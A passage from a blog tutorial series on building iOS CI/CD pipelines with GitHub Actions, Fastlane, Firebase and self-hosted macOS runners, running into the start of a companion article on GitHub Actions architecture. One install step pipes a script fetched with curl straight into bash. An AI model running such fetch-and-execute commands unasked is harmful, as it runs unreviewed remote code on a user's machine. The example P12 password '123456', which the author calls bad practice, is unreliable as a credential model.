$GITHUB_OUTPUT # Install or set runner Ruby version to project specified version - name: Set up Ruby uses: ruby/setup-ruby@v1 with: ruby-version: \"${{ steps.read_ruby_version.outputs.ruby_version }}\" # Optional, reason: previously running multiple runners on self-hosted CI/CD shared cocoapods repos folder # Problem solved: small chance of conflict when running pod install simultaneously due to default $HOME/.cocoapods/ # GitHub Hosted Runner does not need this setting # - name: Change Cocoapods Repos Folder # if: contains(runner.labels, 'self-hosted') # run: \\| # # Each runner uses its own .cocoapods folder to prevent resource conflicts # mkdir -p \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/\" # export CP_HOME_DIR=\"$HOME/.cocoapods-${{ env.RUNNER_NAME }}\" # rm -f \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/repos/cocoapods/.git/index.lock\" # ========== Cache Setting Steps ========== # Note: even self-hosted cache is cloud cache and counts usage # Rules: auto delete if not hit for 7 days, max size 10 GB per cache, cache only on successful action # Public Repo: free unlimited # Private Repo: starts at 5 GB # Self-hosted can write own cache &amp; restore scripts or use other tools # Bundle Cache (Gemfile) # Corresponds to Makefile specifying Bundle install path ./vendor - name: Cache Bundle uses: actions/cache@v3 with: path: \\| ./vendor key: ${{ runner.os }}-bundle-${{ hashFiles('Gemfile.lock') }} restore-keys: \\| ${{ runner.os }}-bundle- # CocoaPods Cache (Podfile) # Default is project/Pods folder - name: Cache CocoaPods uses: actions/cache@v3 with: path: \\| ./Product/Pods key: ${{ runner.os }}-cocoapods-${{ hashFiles('Product/Podfile.lock') }} restore-keys: \\| ${{ runner.os }}-cocoapods- # Mint cache # Corresponds to Makefile specifying Mint install path ./mint - name: Cache Mint uses: actions/cache@v3 with: path: ./mint key: ${{ runner.os }}-mint-${{ hashFiles('Mintfile') }} restore-keys: \\| ${{ runner.os }}-mint- # ==================== # Project setup &amp; dependency installation - name: Setup &amp; Install Dependency run: \\| # Run setup command wrapped by Makefile, roughly: # brew install mint # bundle config set path 'vendor/bundle' # bundle install # mint bootstrap # ... # other setup commands make setup # Run install command wrapped by Makefile, roughly: # mint run yonaskolb/XcodeGen --quiet # bundle exec pod install # ... # other install commands make install - name: Deploy Beta id: deploy # Specify working directory so no need to cd later working-directory: ./Product/ env: # Build input parameters VERSION_NUMBER: ${{ inputs.VERSION_NUMBER \\|\\| '' }} BUILD_NUMBER: ${{ inputs.BUILD_NUMBER \\|\\| '' }} RELEASE_NOTE: ${{ inputs.RELEASE_NOTE \\|\\| '' }} AUTHOR: ${{ github.actor }} # Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; secrets # Firebase CLI Token (see article for how to get) FIREBASE_CLI_TOKEN: ${{ secrets.FIREBASE_CLI_TOKEN }} # Apple Developer Program Team ID TEAM_ID: ${{ secrets.TEAM_ID }} # Specify this job to use XCode_x.x.x version DEVELOPER_DIR: \"/Applications/Xcode_${{ steps.read_xcode_version.outputs.xcode_version }}.app/Contents/Developer\" run: \\| # Get current timestamp BUILD_TIMESTAMP=$(date +'%Y%m%d%H%M%S') # Use timestamp as build number if BUILD_NUMBER is empty BUILD_NUMBER=\"${BUILD_NUMBER:-$BUILD_TIMESTAMP}\" ID=\"${{ github.run_id }}\" COMMIT_SHA=\"${{ github.sha }}\" BRANCH_NAME=\"${{ github.ref_name }}\" AUTHOR=\"${{ env.AUTHOR }}\" # Compose release note RELEASE_NOTE=\"${{ env.RELEASE_NOTE }} ID: ${ID} Commit SHA: ${COMMIT_SHA} Branch: ${BRANCH_NAME} Author: ${AUTHOR} \" # Run Fastlane build &amp; deploy lane bundle exec fastlane beta release_notes:\"${RELEASE_NOTE}\" version_number:\"${VERSION_NUMBER}\" build_number:\"${BUILD_NUMBER}\" # GitHub Actions recommended self-hosted security cleanup: # ref: https://docs.github.com/en/actions/how-tos/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development#required-clean-up-on-self-hosted-runners # Corresponds to step: Install the Apple certificate and provisioning profile # Purpose is to delete downloaded keychain certificates on the machine # If using Match, rewrite to Match's clean - name: Clean up keychain and provisioning profile if: ${{ always() &amp;&amp; contains(runner.labels, 'self-hosted') }} run: \\| security delete-keychain $RUNNER_TEMP/app-signing.keychain-db rm ~/Library/MobileDevice/Provisioning\\ Profiles/build_pp.mobileprovision Remember to go to Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; secrets and add a TEAM_ID variable with the Apple Developer Team ID string.Commit files to the Repo main branch and test the packaging function: Please note that if other branches want to use this Action, they need to first merge the CD-Deploy.yml file from the main branch.Wait for the task to complete:Demo Packaging + Deployment Successful ‚úÖFull Code: CD-Deploy.ymlTechnical Details ‚Äî Obtaining &amp; Setting Firebase CLI TokenAccording to the Firebase official documentation steps:First, install the Firebase CLI tool:curl -sL https://firebase.tools \\| bashExecute:firebase login:ciComplete login and authorization:Back to Terminal, copy the Firebase CLI Token:Go to Repo ‚Üí Settings ‚Üí Secrets and variables ‚Üí Actions ‚Üí Add a new Secret: FIREBASE_CLI_TOKEN and paste the Firebase CLI Token. This Token = your login identity Please keep it safe. If the account holder leaves, it must be replaced.Technical Details ‚Äî Install the Apple Certificate and Provisioning ProfileSupplement detailed steps for importing development certificates into Runner.Since GitHub Actions Secrets cannot store files, all credential files must first be converted to Base64 encoded text and saved in Secrets. Then, in the GitHub Actions step, they are dynamically read, written to a TEMP file, and moved to the correct location for the system to access.Packaging Development requires two key certificates: Provision Profile ( .mobileprovision) Development Certificate ( .p12) cicd.mobileprovisiondevelopment.cerThe Certificate downloaded from Apple Developer is in .cer format, but we need it in .p12 format. You can double-click the downloaded .cer file to install it into Keychain, then open Keychain, right-click the certificate, and choose Export.File name: cicd.p12, format .p12P12 Key Password: Enter a secure custom string (the example is a bad practice, using 123456)Now two files are ready: cicd.p12, cicd.mobileprovisionConvert to BASE64 String and Save to Repo Secrets:base64 -i cicd.mobileprovision \\| pbcopyGo to Repo ‚Üí Settings ‚Üí Secrets and variables ‚Üí Actions ‚Üí Add a new Secret: BUILD_PROVISION_PROFILE_BASE64 and paste the above content.-base64 -i cicd.p12 \\| pbcopyGo to Repo ‚Üí Settings ‚Üí Secrets and variables ‚Üí Actions ‚Üí Add a new Secret: BUILD_CERTIFICATE_BASE64 and paste the above content.-Go to Repo ‚Üí Settings ‚Üí Secrets and variables ‚Üí Actions ‚Üí Add a new Secret: P12_PASSWORD with the password used when exporting the P12 key.-Go to Repo ‚Üí Settings ‚Üí Secrets and variables ‚Üí Actions ‚Üí Add a new Secret: KEYCHAIN_PASSWORD:If using a GitHub Hosted Runner, enter any random string. If using a Self-hosted Runner, enter the login password of the macOS Runner user.Technical Details ‚Äî App Store Connect API KeyFastlane packaging and deployment to App Store, Testflight Required .json key is also limited by GitHub Actions Secrets, which can only store strings, not files. Therefore, we need to convert the key content into a Base64 string, then dynamically read it in the GitHub Actions step, write it to a TEMP file, and provide the file path to Fastlane for use.First, go to App Store Connect to create &amp; download the App Store Connect API Key (.p8):-----BEGIN PRIVATE KEY-----sssaxzzvcxzzxzvzcxvvzxcvzxvczxcvz-----END PRIVATE KEY-----Add a new app_store_connect_api.json file ( refer to content ):{ \"key_id\": \"Key ID as written in App Store Connect\", \"issuer_id\": \"Issuer ID as written in App Store Connect\", \"key\": \"-----BEGIN PRIVATE KEY----- Remember to replace line breaks with \\\\n -----END PRIVATE KEY-----\", \"duration\": 1200, # optional (maximum 1200) \"in_house\": false # optional but may be required if using match/sigh}Run after saving the file:base64 -i app_store_connect_api.json \\| pbcopyPaste the string content into Repo ‚Üí Settings ‚Üí Secrets and variables ‚Üí Actions ‚Üí Add a new Secret: APP_STORE_CONNECT_API_KEY_BASE64 and paste the above content.After completing the Read and Write Apple Store Connect API Key to Temp step, in the following steps just pass the env APP_STORE_CONNECT_API_KEY_PATH:- name: Deploy env: APP_STORE_CONNECT_API_KEY_PATH: \"${{ runner.temp }}/${{ env.APP_STORE_CONNECT_API_KEY_FILE_NAME }}\" run: \\| ....Fastlane can automatically obtain usage.Technical Extension ‚Äî Reuse Action Workflow: Splitting, Packaging, and Deploying ActionsIn this case, we directly use the Fastlane beta lane to perform both packaging and deployment.In real cases, we may need to deploy the same build to different platforms (Firebase, Testflight, etc.). Therefore, a better approach is to have packaging as one action and deployment as another action, to avoid running the packaging process twice. This also aligns better with the responsibility division in CI/CD. The following is a sample introduction:CI-Build.yml:name: Buildon: push: branches: - main workflow_call: inputs: RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: stringjobs: build: runs-on: macos-latest steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: \\| make steup make instal - name: Build Project run: bundle exec fastlane build - name: Upload Build Artifact uses: actions/upload-artifact@v4 with: name: build-artifact path: ./fastlane/build/CD-Deploy-Firebase.yml:name: Deploy Firebaseon: # Automatically trigger when the Build Action is completed workflow_run: workflows: [\"Build\"] types: - completedjobs: deploy: runs-on: ubuntu-latest # Deploy only if completed and successful if: ${{ github.event.workflow_run.conclusion == 'success' }} steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: \\| make steup - name: Download Build Artifact uses: actions/download-artifact@v4 with: name: build-artifact path: ./fastlane/build/ - name: Deploy to Production run: \\| bundle exec fastlane deploy-firebaseCD-Deploy-Testflight.yml:name: Deploy Testflighton: # Automatically trigger when Build Action is completed workflow_run: workflows: [\"Build\"] types: - completedjobs: deploy: runs-on: ubuntu-latest # Deploy only if completed and successful if: ${{ github.event.workflow_run.conclusion == 'success' }} steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: \\| make steup - name: Download Build Artifact uses: actions/download-artifact@v4 with: name: build-artifact path: ./fastlane/build/ - name: Deploy to Production run: \\| bundle exec fastlane deploy-testflightYou can also use Reusing Workflow :CD-Deploy-Firebase.yml:name: Deploy Firebaseon: # Any trigger condition, here using manual form trigger as an example workflow_dispatch: inputs: RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: stringjobs: build: needs: Build uses: ./.github/workflows/CD-Build.yml secrets: inherit with: RELEASE_NOTE: ${{ inputs.RELEASE_NOTE }} deploy: runs-on: ubuntu-latest # Jobs run concurrently by default, use needs to wait for build to finish before running needs: [build] # Deploy only if previous step succeeded if: ${{ always() &amp;&amp; needs.deploy.result == 'success' }} steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: \\| make steup - name: Download Build Artifact uses: actions/download-artifact@v4 with: name: build-artifact path: ./fastlane/build/ - name: Deploy to Production run: \\| bundle exec fastlane deploy-firebaseGitHub Actions ‚Äî ArtifactLike Cache, currently even the Self-hosted Runner Artifact feature still uses GitHub Cloud, subject to usage limits (free accounts start at 500MB). To achieve a similar effect with a Self-hosted Runner, you can create a shared host directory yourself or use other tools as alternatives.Therefore, I currently use Artifact only to store small data, such as Snapshot Test errors, test reports, and so on.CI‚Äî Nightly Build Snapshot + Unit Tests + Packaging + CD Deployment to Firebase App DistributionProcessRun all tests (unit + snapshot tests) automatically at 3 AM daily on the main (develop or master) branch. If tests fail, send a failure notification to the Slack workspace; if successful, package and deploy a version to Firebase App Distribution. Send Slack notifications for both packaging success and failure.CI-Nightly-Build-And-Deploy.ymlRepo ‚Üí Actions ‚Üí New workflow ‚Üí set up a workflow yourself.# Workflow(Action) Namename: CI-Nightly Build And Deploy# Actions Log Titlerun-name: \"[CI-Nightly Build And Deploy] ${{ github.ref }}\"# Trigger Eventson: # Scheduled automatic execution # https://crontab.guru/ # UTC Time schedule: # 19:00 UTC = 03:00 UTC+8 daily - cron: '0 19 * * *' # Manual trigger workflow_dispatch:# Job Items# Jobs run concurrentlyjobs: # Testing job testing: # Reuse Workflow (workflow_call) uses: ./.github/workflows/CI-Testing.yml # Pass all Secrets to CD-Testing.yml secrets: inherit with: # Run all tests TEST_LANE: \"run_all_tests\" # Target branch: main, develop or master...etc BRANCH: \"main\" deploy-env: runs-on: ubuntu-latest outputs: DATE_STRING: ${{ steps.get_date.outputs.DATE_STRING }} steps: - name: Get Date String id: get_date run: \\| VERSION_DATE=$(date -u '+%Y%m%d') echo \"${VERSION_DATE}\" echo \"DATE_STRING=${VERSION_DATE}\" &gt;&gt; $GITHUB_ENV echo \"DATE_STRING=${VERSION_DATE}\" &gt;&gt; $GITHUB_OUTPUT deploy: # Jobs run concurrently by default, use needs to wait for testing and deploy-env to finish needs: [testing, deploy-env] # Run only if testing succeeds if: ${{ needs.testing.result == 'success' }} # Reuse Workflow (workflow_call) uses: ./.github/workflows/CD-Deploy.yml # Pass all Secrets to CD-Deploy.yml secrets: inherit with: VERSION_NUMBER: NightlyBuild-${{ needs.deploy-env.outputs.DATE_STRING }} RELEASE_NOTE: NightlyBuild-${{ needs.deploy-env.outputs.DATE_STRING }} # Target branch: main, develop or master...etc BRANCH: \"main\"# ----- Slack Notify ----- testing-failed-slack-notify: needs: [testing] runs-on: ubuntu-latest if: ${{ needs.testing.result == 'failure' }} steps: - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: \\| channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} text: \":x: Nightly Build - Testing Failed\\nWorkflow: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\\|View Run&gt;\" deploy-failed-slack-notify: needs: [deploy] runs-on: ubuntu-latest if: ${{ needs.deploy.result == 'failure' }} steps: - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: \\| channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} text: \":x: Nightly Build Deploy Failed\\nWorkflow: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\\|View Run&gt;\" deploy-success-slack-notify: needs: [deploy] runs-on: ubuntu-latest if: ${{ needs.deploy.result == 'success' }} steps: - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: \\| channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} text: \":white_check_mark: Nightly Build Deploy Succeeded\\nWorkflow: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\\|View Run&gt;\"Commit files to the Repo main branch, manually trigger test and build functions to see the results: Will be triggered automatically daily in the future.DemoAfter waiting for the testing task, packaging and deployment task, and notification task to complete, check the results.We can directly install the Nightly Build version on our phones for early testing and experience.Technical DetailsThis Action directly reuses the previously designed CI-Testing and CD-Deploy, combining them into our Nightly Build. It‚Äôs very flexible and easy to use!Full code: CI-Nightly-Build-And-Deploy.ymlSelf-hosted Runner NotesThis article uses a Public Repo, so it directly uses GitHub Hosted macOS Runners. However, in actual work, our Repos are always Private. Using GitHub Hosted Runners is very expensive and not cost-effective (about the cost of buying a Mac Mini per month to run continuously in the office). Each Mac Mini can run multiple Runners concurrently based on its performance to handle tasks. For details, please refer to the previous article section ‚Äú Setting up and Switching to Self-hosted Runner‚Äù. After installing XCode and the basic environment on your local computer, register and activate the Runner, then change runs-on to [self-hosted] in the Action Workflow YAML.*The issue of multiple Runners on the same computer has mostly been resolved in the Actions above, such as changing all dependent shared directories to local directories. Another problem encountered during testing that needs to be addressed is the simulator contention issue: ‚ÄúWhen two test Jobs are run simultaneously by two Runners on the same machine, specifying the same simulator causes interference, leading to test failures.‚ÄùThe solution is simple: assign one emulator to each individual Runner.Setting Multiple Runners on the Same Machine EmulatorAssuming I have two Runners on the same computer receiving tasks in parallel: ZhgChgLideMacBook-Pro-Runner-A ZhgChgLideMacBook-Pro-Runner-B In XCode Simulator settings, we need to add two simulators: Model, iOS Version, and Test EnvironmentChange the test steps in CI-Testing.yml to:# Run Fastlane Unit Test Lane - name: Run Tests id: testing # Set working directory so no need to cd ./Product/ in later commands working-directory: ./Product/ env: # ... # Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; variables # Simulator iOS version SIMULATOR_IOS_VERSION: ${{ vars.SIMULATOR_IOS_VERSION }} # Current Runner name RUNNER_NAME: ${{ runner.name }} # ... run: \\| # ... bundle exec fastlane ${TEST_LANE} device:\"${RUNNER_NAME} (${SIMULATOR_IOS_VERSION})\" \\| tee \"$RUNNER_TEMP/testing_output.txt\" # ... device change to ${RUNNER_NAME} (${SIMULATOR_IOS_VERSION}) SIMULATOR_IOS_VERSION is still uniformly referenced from the Repo variables. The combined result will be (using 18.4 as an example): Runner: ZhgChgLideMacBook-Pro-Runner-ASimulator: ZhgChgLideMacBook-Pro-Runner-A(18.4) Runner: ZhgChgLideMacBook-Pro-Runner-BSimulator: ZhgChgLideMacBook-Pro-Runner-B(18.4) This way, when two Runners run tests simultaneously, two simulators will start and run independently.Complete Project RepoAdditional SSH Agent Setup ‚Äî For Fastlane Match or Private CocoaPods RepoWhen using Fastlane Match or a Private CocoaPods Repo, since it is in another Private Repo, the current Repo/Action environment cannot directly git clone. You need to set up the SSH agent environment to have permission to operate during the Action execution.Step 1. Generate SSH Keyssh-keygen -t ed25519 -C \"zhgchgli@gmail.com\"Enter file in which to save the key (/Users/zhgchgli/.ssh/id_ed25519): /Users/zhgchgli/Downloads/zhgchgli Enter the download path to make it easier for us to copy the contentEnter passphrase for ‚Äú/Users/zhgchgli/Downloads/zhgchgli‚Äù (empty for no passphrase): Leave Blank: For CI/CD usage, passphrase input is not possible in CLI interaction, so please leave it blank Generation completed ( .pub/private_key) Step 2. Set Deploy Key in Private Repogithub-actions-ci-cd-demo-certificates RepoSettings ‚Üí Security ‚Üí Deploy keys ‚Üí Add deploy key. Title: Enter Key Name Key: Paste the .pub Key content Completed.Step 3. Set SSH Private Key to Secrets in the Action‚Äôs Repogithub-actions-ci-cd-demo RepoSettings ‚Üí Secrets and variables ‚Üí Actions ‚Üí New repository secret. Name: Enter the key variable name SSH_PRIVATE_KEY Secret: Paste the private_key content Completed.Step 4. SSH Agent setup completed, now verify the permission for Git Clone Private RepoDemo-Git-Clone-Private-Repo.yml :name: Demo Git Clone Private Repoon: workflow_dispatch:jobs: clone-private-repo: name: Git Clone Private Repo runs-on: ubuntu-latest timeout-minutes: 30 steps: # üîê Enable SSH Agent and add private key - name: Setup SSH Agent uses: webfactory/ssh-agent@v0.9.0 with: ssh-private-key: ${{ secrets.SSH_PRIVATE_KEY }} # üõ°Ô∏è Add github.com to known_hosts to avoid host verification errors - name: Add GitHub to known_hosts run: \\| mkdir -p ~/.ssh ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts # üì¶ Clone private repo using SSH and verify - name: Clone and Verify Private Repo run: \\| git clone git@github.com:ZhgChgLi/github-actions-ci-cd-demo-certificates.git ./fakeMatch/ if [ -d \"./fakeMatch/.git\" ]; then echo \"‚úÖ Repo cloned successfully into ./fakeMatch/\" cd ./fakeMatch echo \"üìå Current commit: $(git rev-parse --short HEAD)\" else echo \"‚ùå Clone failed. SSH Agent may not be configured properly.\" exit 1 fiYou can use the above Action to verify if the setup was successful.Success. Subsequent fastlane match or pod install for private pods should work correctly.SummaryThis article details the development of a complete iOS CI/CD process using GitHub Actions. The next article will optimize the user experience for engineers, PMs, and designers by enhancing Slack notifications and integrating GitHub Actions with Google Apps Script Web App to create a free and easy-to-use cross-team packaging platform tool.Series Articles: CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team with CI/CD? Tool Selection? CI/CD Practical Guide (Part 2): Comprehensive Use and Setup of GitHub Actions and Self-hosted Runner CI/CD Practical Guide (Part 3): Implementing CI and CD Workflows for App Projects Using GitHub Actions CI/CD Practical Guide (Part 4): Using Google Apps Script Web App with GitHub Actions to Build a Free and Easy Packaging Tool Platform üç∫ Buy me a beer on PayPal This series of articles took a lot of time and effort to write. If the content helps you or significantly improves your team‚Äôs work efficiency and product quality, feel free to buy me a coffee. Thank you for your support!üç∫ Buy me a beer on PayPalüç∫ Buy me a beer on PayPalIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "GitHub ActionsÔΩúSelf-hosted Runner Setup and Usage Guide for Efficient CI/CD", "url": "/posts/zrealm-dev/github-actions-self-hosted-runner-setup-and-usage-guide-for-efficient-ci-cd-404bd5c70040/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, ci-cd, github-actions, github, self-hosted", "date": "2025-07-02 20:22:32 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!CI/CD Practical Guide (Part 2): Comprehensive Use and Setup of GitHub Actions ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!CI/CD Practical Guide (Part 2): Comprehensive Use and Setup of GitHub Actions and Self-hosted RunnerTake you through the basics of GitHub Actions/Self-hosted Runner operation and a step-by-step tutorial.Photo by Dan TaylorPrefaceThe previous article ‚ÄúCI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team with CI/CD? Tool Selection?‚Äù introduced what CI/CD is, the benefits it brings, and tool selection. This article will focus on the architecture and usage of GitHub Actions and Self-hosted Runners, and guide you step-by-step to create several interesting automated workflows to help you get started.GitHub Actions Architecture FlowchartBefore we begin, let‚Äôs first clarify the operational framework, workflow relationships, and responsibilities of GitHub Actions.GitHub Repo In the world of GitHub Actions, all Actions (Workflow YAML files) must be stored within a Git repo (REPO/.github/workflows/).GitHub Repo ‚Äî Actions SecretsRepo ‚Üí Settings ‚Üí Secrets and variables ‚Üí Actions ‚Üí Secrets. Store the Secret Key and Token used in the Actions stepse.g. Slack Bot Token, Apple Store Connect API .p8 Key *Secrets cannot be viewed in the Action Log and will be automatically masked with * * * ** Secrets content cannot be viewed or edited, only overwritten Secrets currently only support plain text content and cannot upload files- For binary data, please refer to the official steps to store using Base64 encoding. For storing iOS development certificates, refer to the official guide: Installing an Apple certificate on macOS runners for Xcode development Can store organization-level Secrets, shared across ReposGitHub Repo ‚Äî Actions VariablesRepo ‚Üí Settings ‚Üí Secrets and variables ‚Üí Actions ‚Üí Variables. Store commonly used variables in Actions stepse.g. Simulator iOS version, working directory Variables content can be viewed and edited Variables content can be output in the Action Log Variables only support plain text, but you can store JSON strings and parse them yourself for use. You can save organization-level Variables and share them across Repos. GitHub Actions ‚Äî Trigger The Most Important Starting Point in Github Actions ‚Äî Trigger Events (Conditions) Only GitHub Actions triggered by the specified event will run. The complete list of events is available in the official documentation It basically covers all event scenarios in CI/CD and automation.However, if there are special cases without direct events, you can only use other events combined with conditional checks in the Job or use Schedule to manually check.For example, if there is no PR Merged event, you can use pull_request: closed + Job if: github.event.pull_request.merged == true to achieve this. Common Events: schedule (cron): Scheduled execution (same as crontab)Can be used for automation: scheduled PR checks, scheduled builds, scheduled execution of automation scriptsAll run uniformly on main / develop (Default Branch). pull_request:: PR-related eventsWhen a PR is opened, assigned, labeled, new commits are pushed, etc. issues and issue_comment: Issue-related eventsWhen an Issue is opened, when there is a new comment, and so on. workflow_dispatch: manual trigger; you can set required input fields, and GitHub Actions provides a simple form for users to fill in information.e.g.: workflow_call: Triggers another Action (Workflow) to execute a task. workflow_run: Triggers this task when another Action (Workflow) runs a job. For more event types and configuration details, please refer to the official documentation.GitHub Actions ‚Äî Workflow a.k.a Action Use YAML to write .yaml files, all stored under the REPO/.github/workflows/ directory. Use the Workflow YAML file in the main branch as the source of truthIf you can‚Äôt see the Action being developed or encounter errors in other branches, try merging back into the main branch first. The most basic unit in GitHub Actions, each Workflow represents a CI/CD or automation process. Workflow can call other Workflows to execute tasks(This feature can be used to separate core Workflows and called Workflows) This defines the task name, execution strategy, trigger events, task jobs, and all other action-related settings. The current file structure does not support subdirectories. Action Completely Free (Public and Private Repo) GitHub Actions ‚Äî Workflow ‚Äî Job Execution Units in GitHub Actions Definition of Tasks in a Workflow Each Workflow can have multiple Jobs Each Job needs to specify which Runner Label to use. During execution, the corresponding Runner machine will be used to run the task. Multiple Jobs Run Concurrently (use needs to enforce order if needed) Each Job should be treated as an independent execution unit (each as a Sandbox). If a Job produces resource files that need to be used by subsequent Jobs or Workflows after completion, you must Upload Artifacts or move them to a shared output directory on self-hosted runners. Job can output strings for other Jobs to reference.(For example, execution results like true or false) If no specific workflow conditions are set, when multiple Jobs are running and one Job encounters an error, the other Jobs will still continue to execute. GitHub Actions ‚Äî Reuse Workflow/Job Defining on: workflow_call in a workflow allows it to be encapsulated and reused as a Job by other workflows. Sharing across repositories is possible within the same organization. Therefore, CI/CD tasks shared across repositories can be placed in a shared repository for common use. GitHub Actions ‚Äî Workflow ‚Äî Job ‚Äî Step Minimal Workflow in GitHub Actions The program that actually executes the tasks in the Job Each Job can have multiple Steps Multiple steps are executed in order Step can output strings for subsequent Steps to reference and use. Steps can directly write shell script programsYou can reference gh cli and current environment variables (e.g., get PR number) to directly do what you want. If no specific flow conditions are set, the Step will stop immediately if an error occurs, and subsequent Steps will not execute. GitHub Actions ‚Äî Workflow ‚Äî Job ‚Äî Reuse Action Step You can directly reuse existing workflows created by experts on Marketplace.For example: Comment content on PR. You can also package a series of your work task steps into an Action GitHub Repo for others to reuse directly. Public Repo Actions can be published to the Marketplace Packaging Action supports use: Docker Action ‚Äî means GitHub Actions will pass environment variables into the Docker container, and then you can handle them however you want, such as with shell scripts, Java, PHP, etc. JavaScript/TypeScript Action ‚Äî Write GitHub Actions logic directly using node.js, with environment variables provided for your reference.e.g. pozil/auto-assign-issue Composite (YAML) ‚Äî Pure YAML describing task steps (similar to GitHub Actions ‚Äî Workflow ‚Äî Job ‚Äî Step). You can declare which steps to perform or write shell scripts directly within it.e.g. ZhgChgLi/ZReviewTender Due to length constraints, this article will not cover how to package a Github Actions Action. For those interested, please refer to the official documentation: tutorials/creating-a-composite-action.GitHub Runner GitHub assigns jobs to Runners based on the Runner Label for execution Runner acts only as a listener, polling and monitoring tasks dispatched by GitHub. Only cares about the Job, not which Action (Workflow) it belongs to.Therefore, after Action A‚Äôs Job-1 finishes, the next one will be Action B‚Äôs Job-1, instead of completing all Jobs of Action A before moving to Action B. Runner can use GitHub Hosted Runner or Self-hosted Runner. GitHub Hosted Runner GitHub provides Runners, refer to the official Repo list:Images list for 2025/06 What is pre-installed on the Runner can be viewed by clicking:e.g. macos-14-arm64macos-14-arm64 iOS development prioritizes using the -arm64 (M-series) processor Runner for faster performance Simply paste the YAML Label from the table into the Job run-on to use that Runner for the task. Public Repo Pricing: Completely Free with Unlimited Use Ô∏è Private Repo Free Tier:Free tier (varies by account type, GitHub Free as an example):Usage: 2,000 minutes free per monthStorage: 500 MB ‚ö†Ô∏èÔ∏èPrivate Repo Billing Method:After exceeding the free quota, usage-based billing starts (with adjustable limits and notifications). Prices vary depending on the operating system and cores of the machine running the Runner: about-billing-for-github-actionsYou can see that macOS is expensive because the device costs are very high. Maximum Concurrent Task Limit:usage-limits-billing-and-administration This part is too off-topic; our focus is on Self-hosted Runner.Self-hosted Runner on In-house Server Using Your Own Machine as a Runner A physical machine can run multiple Runners to handle tasks concurrently Free Unlimited Usage Without RestrictionsOnly the machine purchase cost, pay once and use as much as you want!Based on a 32G RAM M4 Mini (=NT$40,900), if you use GitHub Hosted Runner, it costs 500 USD per month; buying a machine and setting it up pays off in just over three months! Supports Windows, macOS, Linux (x64/ARM/ARM64) The same organization can share Runners across Repos ‚ö†Ô∏èCurrently: actions/cache, actions/upload-artifact, and actions/download-artifact only support GitHub cloud services, meaning these contents are still uploaded to GitHub servers and storage usage is charged.You can set up a shared directory on your own machine as an alternative. Self-hosted Runner also supports Docker, k8s, but I haven‚Äôt explored it. Setting up a Self-hosted Runner takes just a few steps (ready within 10 minutes) to go online and start handling tasks (explained later in this article).GitHub Workflow x Job x Step x Runner Process Relationship DiagramHere is a diagram summarizing the workflow and relationships, assuming we have two Workflows and two Runners: CI ‚Äî Suppose R has 3 Jobs, each Job contains several Steps, Runner Label (run-on) ‚Äî self-hosted-app CD ‚Äî There are 4 Jobs, each with several Steps. Runner Label (run-on) ‚Äî self-hosted-app Runner ‚Äî There are 2, and both Runner Labels are ‚Äî self-hosted-app As mentioned earlier, the Runner and Workflow dispatch and receive tasks based on the Runner Label. In this case, the same self-hosted-app Runner Label is used. Jobs in the Workflow run concurrently by default, while Steps are the actual execution content of each Job, running sequentially in order. When all Steps are completed, the Job is considered finished. Therefore, the actual execution timeline of the Workflow will alternate between two Runners to run Jobs, can run concurrently, and the next Job after the current one finishes is not necessarily the next Job in the same Workflow. ‚ö†Ô∏è This is why ensuring each Job is independent is crucial (especially in a Self-hosted Runner environment, where cleanup after a Job may not be thorough. We might subconsciously assume the output of one Job can be used by the next Job), but it should not be used this way.If a Job produces output to be used by subsequent Jobs: Job Output String : Output plain text to a variable for other jobs to reference Artifact-upload/download: The last step of a Job uploads the execution results to GitHub Artifact, and the first step of another Job downloads it for further processing.e.g. For example, Job ‚Äî Packaging ‚Üí upload the packaged .ipa to Artifact ‚Üí Job ‚Äî Deployment ‚Üí download the .ipa ‚Üí upload to App Store for deploymentNote: Currently, even for Self-hosted runners, the artifacts are stored on GitHub Artifact cloud storage. AWS/GCP‚Ä¶ 